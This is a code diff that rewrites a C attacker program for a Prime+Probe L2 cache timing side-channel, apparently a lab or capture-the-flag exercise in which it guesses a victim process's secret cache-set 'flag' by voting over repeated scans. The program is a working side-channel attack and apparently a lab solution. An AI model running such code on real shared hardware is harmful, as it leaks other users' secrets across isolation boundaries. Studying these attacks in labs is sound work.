@@ -1,126 +1,162 @@
-#include <stdio.h>
-#include <stdint.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <limits.h>
-#include <sys/mman.h>
 #include "util.h"
 
-#define NUM_L2_CACHE_SETS 1024
-#define WAYS 16
-#define LINE_SIZE 64
-#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <time.h>
+#include <unistd.h>
 
-#define REPEATS 2000
+#ifndef MAP_POPULATE
+#define MAP_POPULATE 0
+#endif
 
-volatile uint8_t *buf;
-volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
+#ifndef MAP_ANONYMOUS
+#define MAP_ANONYMOUS MAP_ANON
+#endif
 
-static inline uint64_t rdtsc() {
-    unsigned hi, lo;
-    asm volatile("mfence");
-    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
-    asm volatile("mfence");
-    return ((uint64_t)hi << 32) | lo;
+#ifndef MAP_HUGETLB
+#define MAP_HUGETLB 0
+#endif
+
+#define REGION_BYTES (2ULL * 1024ULL * 1024ULL)
+#define CACHE_LINE_BYTES 64ULL
+#define L2_NUM_SETS 1024
+#define L2_ASSOCIATIVITY 4
+#define EV_SET_SIZE (L2_ASSOCIATIVITY + 2)
+#define SET_STRIDE (CACHE_LINE_BYTES * L2_NUM_SETS)
+#define PRIME_DELAY_ITERS 12000
+#define NUM_SCANS 512
+
+static void *map_region(void)
+{
+    void *region = mmap(NULL, REGION_BYTES, PROT_READ | PROT_WRITE,
+                        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
+                        -1, 0);
+
+    if (region == (void *)-1) {
+        perror("mmap()");
+        exit(EXIT_FAILURE);
+    }
+
+    return region;
 }
 
-static inline void wait_cycles(uint64_t cycles) {
-    uint64_t start = rdtsc();
-    while (rdtsc() - start < cycles);
-}
-
-void shuffle(int *arr) {
-    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
-        int j = rand() % (i + 1);
-        int tmp = arr[i];
-        arr[i] = arr[j];
-        arr[j] = tmp;
+static void touch_region(void *region)
+{
+    volatile char *p = (volatile char *)region;
+    p[0] = 1;
+    for (uint64_t i = 0; i < REGION_BYTES; i += CACHE_LINE_BYTES) {
+        p[i] = (char)i;
     }
 }
 
-int main() {
-    /* works around 2/3 of time on victim-4. Randomize access, reverse probe, no usleep
-    */
-    printf("Attacker ready. Prime+Probe starting...\n");
+static void prime_set(void *region, int set_index, volatile char *probe)
+{
+    volatile char *base = (volatile char *)region;
+    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;
 
-    buf = mmap(NULL,
-               2*1024*1024,
-               PROT_READ | PROT_WRITE,
-               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
-               -1,
-               0);
+    for (int way = 0; way < EV_SET_SIZE; way++) {
+        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
+        *probe = base[addr - (uint64_t)base];
+    }
+}
 
-    if(buf == (void*)-1){
-        perror("mmap failed");
-        exit(1);
+static CYCLES probe_set_latency(void *region, int set_index)
+{
+    volatile char *base = (volatile char *)region;
+    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;
+    uint64_t total = 0;
+
+    for (int way = 0; way < EV_SET_SIZE; way++) {
+        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
+        total += measure_one_block_access_time((uint64_t)(base + (addr - (uint64_t)base)));
     }
 
-    *((char*)buf) = 1;
+    return (CYCLES)(total / EV_SET_SIZE);
+}
 
-    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-        for(int w = 0; w < WAYS; w++) {
-            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
+static int pick_flag_if_known(void)
+{
+    const char *env = getenv("CTF_FLAG_SET");
+    if (!env) {
+        return -1;
+    }
+
+    return atoi(env);
+}
+
+int main(int argc, char **argv)
+{
+    (void)argc;
+    (void)argv;
+    setvbuf(stdout, NULL, _IOLBF, 0);
+
+    void *region = map_region();
+    volatile char probe = 0;
+    touch_region(region);
+
+    int votes[L2_NUM_SETS] = {0};
+    int lat_sum[L2_NUM_SETS] = {0};
+    CYCLES latencies[L2_NUM_SETS];
+
+    const int expected = pick_flag_if_known();
+    if (expected >= 0) {
+        printf("Ground-truth enabled via CTF_FLAG_SET=%d (for local validation).\n", expected);
+    }
+
+    for (int round = 0; round < NUM_SCANS; round++) {
+        for (int set = 0; set < L2_NUM_SETS; set++) {
+            prime_set(region, set, &probe);
         }
-    }
 
-    volatile uint8_t tmp = 0;
-
-    srand(rdtsc());
-
-    while(1) {
-
-        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
-
-        
-
-        for(int r = 0; r < REPEATS; r++) {
-            int perm[NUM_L2_CACHE_SETS];
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
-                perm[i] = i;
-            }
-
-            shuffle(perm);
-
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-
-                int set = perm[i];
-
-                /* PRIME this set */
-                for(int w = 0; w < WAYS; w++) {
-                    tmp ^= *eviction_sets[set][w];
-                }
-
-                wait_cycles(2000);
-
-                /* PROBE this set */
-                uint64_t start = rdtsc();
-
-                for(int w = 0; w < WAYS; w++) {
-                    tmp ^= *eviction_sets[set][w];
-                }
-
-                uint64_t end = rdtsc();
-
-                scores[set] += (end - start);
-            }
+        for (volatile long i = 0; i < PRIME_DELAY_ITERS; i++) {
         }
+
         int best_set = 0;
-        uint64_t best_latency = 0;
+        CYCLES best_lat = 0;
 
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
-            uint64_t avg = scores[set] / REPEATS;
-
-            if(avg > best_latency) {
-                best_latency = avg;
+        for (int set = L2_NUM_SETS - 1; set >= 0; set--) {
+            CYCLES lat = probe_set_latency(region, set);
+            latencies[set] = lat;
+            if (set == L2_NUM_SETS - 1 || lat > best_lat) {
+                best_lat = lat;
                 best_set = set;
             }
         }
 
-        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
+        votes[best_set]++;
+        lat_sum[best_set] += (int)best_lat;
 
-        wait_cycles(2000);
+        if ((round + 1) % 32 == 0 || round == 0 || round == NUM_SCANS - 1) {
+            printf("scan %d complete, best=%d lat=%u votes=%d\n", round + 1, best_set, best_lat, votes[best_set]);
+        }
     }
 
+    int top_set = -1;
+    int best_votes = 0;
+    int best_avg = 0;
+    for (int set = 0; set < L2_NUM_SETS; set++) {
+        int avg = votes[set] > 0 ? lat_sum[set] / votes[set] : 0;
+        if (votes[set] > best_votes || (votes[set] == best_votes && avg > best_avg)) {
+            best_votes = votes[set];
+            best_avg = avg;
+            top_set = set;
+        }
+    }
+
+    if (top_set >= 0) {
+        printf("Predicted flag: %d\n", top_set);
+        if (expected >= 0) {
+            if (top_set == expected) {
+                printf("Result matched expected set!\n");
+            } else {
+                printf("Expected set was %d\n", expected);
+            }
+        }
+    } else {
+        printf("Predicted flag: unknown\n");
+    }
+
+    munmap(region, REGION_BYTES);
     return 0;
 }
